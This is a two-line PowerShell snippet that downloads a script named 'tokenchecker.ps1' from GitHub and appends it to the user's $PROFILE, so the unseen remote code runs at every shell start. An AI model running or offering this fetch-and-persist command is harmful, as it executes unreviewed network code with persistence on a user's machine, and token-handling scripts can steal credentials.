$script = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/TaxMachine/PowershellTokenChecker/main/tokenchecker.ps1"

Add-Content -Path $PROFILE -Value "`n`n$script"